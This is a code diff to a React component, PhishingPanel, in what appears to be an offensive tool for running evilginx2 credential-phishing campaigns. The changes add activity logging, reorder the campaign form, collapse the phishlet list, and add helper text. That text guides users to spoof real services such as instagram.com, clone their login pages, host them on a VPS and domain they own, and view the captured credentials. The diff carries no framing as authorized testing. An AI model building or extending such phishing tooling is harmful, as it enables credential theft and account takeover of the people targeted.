@@ -33,6 +33,7 @@ interface PhishCheckResult {
 
 export function PhishingPanel() {
   const [tab, setTab] = useState<'templates' | 'campaigns' | 'setup'>('templates');
+  const [phishletsOpen, setPhishletsOpen] = useState(true);
   const [checkResult, setCheckResult] = useState<PhishCheckResult | null>(null);
   const [checking, setChecking] = useState(false);
   const [phishlets, setPhishlets] = useState<PhishletTemplate[]>([]);
@@ -96,6 +97,7 @@ export function PhishingPanel() {
         setCampaignName('');
         setTargetDomain('');
         loadCampaigns();
+        window.api.addActivity({ tab: 'phish', type: 'start', label: `Campaign: ${campaignName.trim()}`, detail: `Target: ${targetDomain.trim()}, Template: ${selectedPhishlet}` });
         // Switch to campaigns tab
         setTab('campaigns');
       }
@@ -114,6 +116,7 @@ export function PhishingPanel() {
       setCampaignResult(result);
       setSetupInstructions(result.instructions);
       loadCampaigns();
+      window.api.addActivity({ tab: 'phish', type: 'start', label: `Started Campaign ${campaignId.slice(0, 8)}`, detail: `Domain: ${serverDomain.trim()}, IP: ${serverIP.trim()}` });
     } catch (err: any) {
       alert(`Failed: ${err.message}`);
     }
@@ -122,6 +125,7 @@ export function PhishingPanel() {
   const handleStopCampaign = useCallback(async (campaignId: string) => {
     await window.api.phishStopCampaign(campaignId);
     loadCampaigns();
+    window.api.addActivity({ tab: 'phish', type: 'stop', label: 'Stopped Campaign', detail: `Campaign: ${campaignId.slice(0, 8)}` });
   }, []);
 
   const viewCredentials = useCallback(async (campaignId: string) => {
@@ -141,6 +145,7 @@ export function PhishingPanel() {
       setViewingCampaign(null);
       setCredentials([]);
     }
+    window.api.addActivity({ tab: 'phish', type: 'stop', label: 'Deleted Campaign', detail: `Campaign: ${campaignId.slice(0, 8)}` });
   }, [viewingCampaign]);
 
   const tabs = [
@@ -201,25 +206,7 @@ export function PhishingPanel() {
       {/* ── TAB: Templates ── */}
       {tab === 'templates' && (
         <div className="space-y-3">
-          <div className="card">
-            <div className="card-header">Available Phishlets</div>
-            <div className="space-y-2">
-              {phishlets.map((phishlet, idx) => (
-                <div key={idx} className="p-3 rounded-lg bg-midnight-800/30 border border-midnight-700/30">
-                  <div className="flex items-center justify-between">
-                    <div>
-                      <span className="text-sm font-mono text-gray-200">{phishlet.name}</span>
-                      <span className="text-[10px] text-gray-500 ml-2">({phishlet.domain})</span>
-                    </div>
-                    <span className="text-[10px] text-gray-600">{phishlet.author}</span>
-                  </div>
-                  <p className="text-xs text-gray-500 mt-1">{phishlet.description}</p>
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Create campaign form */}
+          {/* Create campaign form — moved to top */}
           <div className="card border-redhawk-700/30">
             <div className="card-header text-redhawk-400">New Campaign</div>
             <div className="space-y-3">
@@ -230,8 +217,9 @@ export function PhishingPanel() {
                     type="text" value={campaignName}
                     onChange={(e) => setCampaignName(e.target.value)}
                     className="input-field h-9 text-sm"
-                    placeholder="My Phish"
+                    placeholder="e.g. Target Exec Phish"
                   />
+                  <span className="text-[9px] text-gray-600 mt-0.5 block">Any name to identify this campaign</span>
                 </div>
                 <div>
                   <label className="text-[10px] text-gray-500 block mb-1">Target Domain</label>
@@ -239,8 +227,9 @@ export function PhishingPanel() {
                     type="text" value={targetDomain}
                     onChange={(e) => setTargetDomain(e.target.value)}
                     className="input-field h-9 text-sm font-mono"
-                    placeholder="example.com"
+                    placeholder="e.g. instagram.com"
                   />
+                  <span className="text-[9px] text-gray-600 mt-0.5 block">The real domain you're spoofing (from template above)</span>
                 </div>
               </div>
               <div>
@@ -254,11 +243,44 @@ export function PhishingPanel() {
                     <option key={i} value={p.name} className="bg-midnight-900">{p.name} ({p.domain})</option>
                   ))}
                 </select>
+                <span className="text-[9px] text-gray-600 mt-0.5 block">Which service's login page to clone</span>
               </div>
               <button onClick={handleCreateCampaign} disabled={!campaignName.trim() || !targetDomain.trim()} className="btn-primary w-full">
                 Create Campaign
               </button>
             </div>
+          </div>
+
+          {/* Available Phishlets — collapsible tag */}
+          <div className="card">
+            <button
+              onClick={() => setPhishletsOpen(!phishletsOpen)}
+              className="w-full flex items-center justify-between cursor-pointer"
+            >
+              <span className="card-header mb-0">Available Phishlets ({phishlets.length})</span>
+              <svg
+                className={`w-4 h-4 text-gray-500 transition-transform ${phishletsOpen ? 'rotate-180' : ''}`}
+                fill="none" stroke="currentColor" viewBox="0 0 24 24"
+              >
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+              </svg>
+            </button>
+            {phishletsOpen && (
+              <div className="space-y-2 mt-3">
+                {phishlets.map((phishlet, idx) => (
+                  <div key={idx} className="p-3 rounded-lg bg-midnight-800/30 border border-midnight-700/30">
+                    <div className="flex items-center justify-between">
+                      <div>
+                        <span className="text-sm font-mono text-gray-200">{phishlet.name}</span>
+                        <span className="text-[10px] text-gray-500 ml-2">({phishlet.domain})</span>
+                      </div>
+                      <span className="text-[10px] text-gray-600">{phishlet.author}</span>
+                    </div>
+                    <p className="text-xs text-gray-500 mt-1">{phishlet.description}</p>
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
         </div>
       )}
@@ -271,22 +293,24 @@ export function PhishingPanel() {
             <div className="card-header">Your Phishing Server</div>
             <div className="grid grid-cols-2 gap-3">
               <div>
-                <label className="text-[10px] text-gray-500 block mb-1">Domain</label>
+                <label className="text-[10px] text-gray-500 block mb-1">Phishing Domain</label>
                 <input
                   type="text" value={serverDomain}
                   onChange={(e) => setServerDomain(e.target.value)}
                   className="input-field h-9 text-sm font-mono"
-                  placeholder="phish.example.com"
+                  placeholder="e.g. secure-login.xyz"
                 />
+                <span className="text-[9px] text-gray-600 mt-0.5 block">The domain you own, pointed to your VPS (for the phishing page)</span>
               </div>
               <div>
-                <label className="text-[10px] text-gray-500 block mb-1">Server IP</label>
+                <label className="text-[10px] text-gray-500 block mb-1">VPS Public IP</label>
                 <input
                   type="text" value={serverIP}
                   onChange={(e) => setServerIP(e.target.value)}
                   className="input-field h-9 text-sm font-mono"
-                  placeholder="1.2.3.4"
+                  placeholder="e.g. 203.0.113.42"
                 />
+                <span className="text-[9px] text-gray-600 mt-0.5 block">Your server's public IP where evilginx2 will run</span>
               </div>
             </div>
           </div>
